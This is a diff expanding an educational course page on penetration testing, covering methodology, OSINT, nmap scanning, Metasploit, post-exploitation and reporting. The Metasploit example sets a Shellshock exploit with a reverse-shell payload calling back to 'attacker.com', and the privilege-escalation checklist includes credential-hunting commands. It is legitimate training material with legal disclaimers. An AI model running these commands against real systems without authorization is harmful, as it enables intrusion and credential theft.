@@ -1,27 +1,233 @@
 ---
 title: "Penetration Testing"
-description: "Introduction to ethical hacking methodology and common tools."
+description: "Ethical hacking methodology, OSINT, scanning, exploitation, privilege escalation, lateral movement, reporting, and bug bounty programs."
 ---
 
 # Penetration Testing
 
-Penetration Testing (Pentesting) is the authorized, simulated cyberattack on a computer system, performed to evaluate the security of the system.
+Penetration Testing (pentesting) is the **authorized, simulated cyberattack** on a computer system, performed to evaluate the security of the system. Unlike malicious hacking, pentesting is legal, contracted, and documented — with the explicit goal of finding and fixing vulnerabilities before real attackers do.
+
+Pentesting is both a methodology and a mindset. It requires understanding how systems work, how they fail, and how attackers exploit those failures.
+
+## Types of Penetration Tests
+
+| Type | Scope | Knowledge Level |
+|------|-------|----------------|
+| **Black Box** | Tester has no prior knowledge of the target | Simulates an external attacker |
+| **White Box** | Tester has full access to source code, architecture, credentials | Simulates an insider or thorough audit |
+| **Gray Box** | Tester has partial knowledge (e.g., user-level credentials, network diagrams) | Most realistic for most scenarios |
+| **External** | Targets internet-facing assets (web apps, APIs, email servers) | Simulates remote attacks |
+| **Internal** | Tester operates from inside the network | Simulates a compromised employee or insider threat |
+| **Red Team** | Full-scope adversary simulation including social engineering, physical access, and multi-stage attacks | Tests the entire security program, not just technology |
 
 ## The Pentesting Methodology
-Professional pentesting follows a structured approach:
 
-1. **Reconnaissance (Information Gathering):** Gathering as much information as possible about the target (IP addresses, domain names, employee names, technology stack).
-2. **Scanning and Enumeration:** Actively interacting with the target to identify open ports, running services, and potential entry points.
-3. **Vulnerability Analysis:** Comparing the gathered information against known vulnerabilities.
-4. **Exploitation:** Attempting to breach the system by exploiting the identified vulnerabilities.
-5. **Post-Exploitation:** Determining the value of the compromised system, maintaining access, and attempting to move laterally to other systems.
-6. **Reporting:** Documenting the findings, the risk they pose, and providing remediation advice.
+Professional pentesting follows a structured, repeatable approach:
 
-## Common Tools of the Trade
+<Steps>
+  <Step title="1. Scoping and Rules of Engagement">
+    Before any testing begins, the scope must be clearly defined in writing:
+    - What systems/networks/applications are in scope?
+    - What is explicitly **out of scope**? (Production databases, third-party services)
+    - What testing methods are allowed? (Social engineering? Physical access? DoS?)
+    - What is the testing window? (Business hours only? Weekends?)
+    - Who are the emergency contacts if something goes wrong?
+    - **Get written authorization.** Testing without explicit permission is a crime.
+  </Step>
+  <Step title="2. Reconnaissance (Information Gathering)">
+    Gather as much information as possible about the target before actively interacting with it.
+  </Step>
+  <Step title="3. Scanning and Enumeration">
+    Actively interact with the target to identify open ports, running services, versions, and potential entry points.
+  </Step>
+  <Step title="4. Vulnerability Analysis">
+    Map the gathered information against known vulnerabilities (CVEs) and common misconfigurations.
+  </Step>
+  <Step title="5. Exploitation">
+    Attempt to breach the system by exploiting identified vulnerabilities.
+  </Step>
+  <Step title="6. Post-Exploitation">
+    After gaining initial access, determine the value of the compromised system, establish persistence, and attempt lateral movement.
+  </Step>
+  <Step title="7. Reporting">
+    Document all findings, the risk they pose, evidence (screenshots, logs), and remediation recommendations.
+  </Step>
+</Steps>
 
-- **Nmap (Network Mapper):** The industry standard for network discovery and security auditing. It determines what hosts are available on a network, what services (application name and version) those hosts are offering, and what operating systems they are running.
-- **Burp Suite:** A comprehensive platform for web application security testing. Its proxy feature allows a tester to intercept, inspect, and modify HTTP traffic between their browser and the target application.
-- **Metasploit Framework:** A powerful tool for developing and executing exploit code against a remote target machine. It contains a massive database of known exploits and payloads.
-- **Wireshark:** A network protocol analyzer that lets you capture and interactively browse the traffic running on a computer network in real time.
+## Phase 2: Reconnaissance (OSINT)
 
-*Disclaimer: These tools must only be used on systems you own or have explicit, written permission to test.*
+**OSINT (Open Source Intelligence)** is intelligence gathered from publicly available sources. It is the foundation of every pentest.
+
+### Passive Reconnaissance (No direct interaction with the target)
+
+| Technique | Tool/Source | What You Learn |
+|-----------|-----------|---------------|
+| DNS records | `dig`, `nslookup`, `dnsdumpster.com` | Subdomains, mail servers, IP ranges |
+| WHOIS lookup | `whois`, `who.is` | Domain registrar, registration date, contact info |
+| Search engine dorking | Google: `site:target.com filetype:pdf` | Exposed documents, login pages, directory listings |
+| LinkedIn | LinkedIn search | Employee names, roles, tech stack (job postings reveal technologies) |
+| GitHub/GitLab | Search repos by organization | Source code, leaked credentials, internal documentation |
+| Shodan | `shodan.io` | Internet-connected devices, exposed services, banner information |
+| Certificate Transparency | `crt.sh` | All TLS certificates issued for a domain (reveals subdomains) |
+| Wayback Machine | `web.archive.org` | Historical versions of the website (may reveal removed content) |
+
+### Active Reconnaissance (Direct interaction — the target may detect you)
+
+Active recon involves directly probing the target's systems. This includes port scanning, service enumeration, and directory brute-forcing.
+
+## Phase 3: Scanning and Enumeration
+
+### Port Scanning with Nmap
+
+**Nmap** is the industry standard for network discovery and security auditing.
+
+```bash
+# Basic TCP scan of the top 1000 ports
+nmap -sT target.com
+
+# Full port scan (all 65535 ports) with service version detection
+nmap -p- -sV -sC target.com
+
+# Aggressive scan (OS detection + scripts + traceroute)
+nmap -A target.com
+
+# UDP scan (slower, but discovers services like DNS, SNMP, TFTP)
+nmap -sU --top-ports 100 target.com
+```
+
+### Web Application Scanning
+
+| Tool | Purpose |
+|------|---------|
+| **Burp Suite** | Intercept, inspect, and modify HTTP traffic. Manual and automated web app testing. |
+| **OWASP ZAP** | Open-source alternative to Burp Suite. Automated vulnerability scanning. |
+| **Nikto** | Web server scanner — detects dangerous files, outdated server software, and misconfigurations. |
+| **ffuf / Gobuster** | Directory and file brute-forcing — discovers hidden paths and admin panels. |
+| **SQLMap** | Automated SQL injection detection and exploitation. |
+
+## Phase 5: Exploitation
+
+Exploitation is the phase where vulnerabilities are leveraged to gain unauthorized access.
+
+### The Metasploit Framework
+
+**Metasploit** is the most widely used exploitation framework. It contains a massive database of known exploits, payloads, and auxiliary modules.
+
+```bash
+# Start Metasploit
+msfconsole
+
+# Search for exploits targeting a specific service
+search type:exploit name:apache
+
+# Select an exploit
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+
+# Set target options
+set RHOSTS target.com
+set RPORT 443
+
+# Select a payload
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST attacker.com
+
+# Execute
+exploit
+```
+
+<Warning>
+**Legal disclaimer**: Using exploitation tools against systems without explicit, written authorization is a criminal offense in virtually every jurisdiction. Always have a signed Statement of Work (SOW) or Rules of Engagement (RoE) before testing. "I was just testing" is not a legal defense.
+</Warning>
+
+## Phase 6: Post-Exploitation
+
+After gaining initial access, a pentester evaluates the actual impact of the compromise.
+
+### Key Activities
+
+- **Privilege Escalation**: Moving from a low-privilege user to root/administrator. Techniques include kernel exploits, misconfigured SUID binaries, writable cron jobs, and unquoted service paths.
+- **Lateral Movement**: Moving from the compromised system to other systems on the network. Techniques include credential harvesting, pass-the-hash, RDP/SSH pivoting, and exploiting trust relationships.
+- **Data Exfiltration**: Identifying and extracting sensitive data (to prove impact, not to steal it). Document what was accessible.
+- **Persistence**: Establishing mechanisms to maintain access (backdoor accounts, scheduled tasks, web shells) — to demonstrate what a real attacker could do.
+
+### Privilege Escalation Checklists
+
+**Linux:**
+- Check `sudo -l` for commands the user can run as root
+- Search for SUID/SGID binaries: `find / -perm -4000 -type f 2>/dev/null`
+- Check cron jobs: `cat /etc/crontab`, `ls -la /etc/cron.*`
+- Check writable paths in PATH environment variable
+- Search for passwords in config files: `grep -r "password" /etc/ 2>/dev/null`
+
+**Windows:**
+- Check `whoami /priv` for enabled privileges
+- Search for unquoted service paths
+- Check AlwaysInstallElevated registry keys
+- Search for stored credentials: `cmdkey /list`
+- Check scheduled tasks running as SYSTEM
+
+## Phase 7: Reporting
+
+The report is the **most important deliverable** of a penetration test. It communicates findings to both technical and non-technical stakeholders.
+
+### Report Structure
+
+1. **Executive Summary**: High-level overview for management — overall risk posture, critical findings, business impact, and strategic recommendations. No technical jargon.
+2. **Scope and Methodology**: What was tested, how, and during what timeframe.
+3. **Findings**: Each vulnerability documented with:
+   - **Title** and **severity** (Critical/High/Medium/Low/Informational)
+   - **CVSS score** (Common Vulnerability Scoring System)
+   - **Description** of the vulnerability
+   - **Evidence** (screenshots, request/response pairs, tool output)
+   - **Impact** (what an attacker could achieve)
+   - **Remediation** (specific, actionable fix)
+4. **Positive Findings**: What security controls were effective.
+5. **Appendices**: Raw tool output, detailed technical data.
+
+## Bug Bounty Programs
+
+Bug bounty programs are a complementary approach where organizations invite external security researchers to find and responsibly disclose vulnerabilities — in exchange for monetary rewards.
+
+### Major Platforms
+
+| Platform | Notable Programs |
+|----------|-----------------|
+| **HackerOne** | US DoD, Uber, GitHub, Shopify |
+| **Bugcrowd** | Tesla, Mastercard, Netflix |
+| **Intigriti** | European-focused, GDPR-compliant |
+
+### Getting Started in Bug Bounty
+
+1. **Learn the fundamentals** (this course is a good start).
+2. **Practice on legal targets**: HackTheBox, TryHackMe, PortSwigger Web Security Academy, OWASP WebGoat.
+3. **Read disclosed reports**: HackerOne's Hacktivity feed shows real-world bug reports.
+4. **Start with low-hanging fruit**: Focus on IDOR, XSS, and information disclosure before attempting complex chains.
+5. **Write clear reports**: The quality of your report is as important as the vulnerability itself.
+
+## Legal and Ethical Framework
+
+Pentesting operates within a strict legal and ethical framework:
+
+- **Always get written authorization** before testing any system.
+- **Stay within scope** — do not test systems or functionalities not covered by the agreement.
+- **Report all findings** — even accidental discoveries outside scope.
+- **Handle data responsibly** — if you access sensitive data during testing, treat it as confidential.
+- **Disclose responsibly** — follow the organization's disclosure timeline. Never publish findings without permission.
+
+### Relevant Laws
+
+| Jurisdiction | Law |
+|-------------|-----|
+| **Brazil** | Lei 12.737/2012 (Lei Carolina Dieckmann) — criminalizes unauthorized access to computer systems |
+| **US** | Computer Fraud and Abuse Act (CFAA) |
+| **EU** | EU Directive on Attacks Against Information Systems (2013/40/EU) |
+| **UK** | Computer Misuse Act 1990 |
+
+## Key Takeaways
+
+1. **Methodology matters**: Follow a structured approach — reconnaissance, scanning, exploitation, post-exploitation, reporting.
+2. **OSINT is powerful**: Publicly available information often reveals more than technical scanning.
+3. **Authorization is non-negotiable**: Testing without permission is a crime, period.
+4. **The report is the product**: A vulnerability discovered but poorly communicated has no value.
+5. **Practice legally**: Use HackTheBox, TryHackMe, and bug bounty programs to build skills.
+6. **Think like an attacker, act like a professional**: The goal is to improve security, not cause harm.
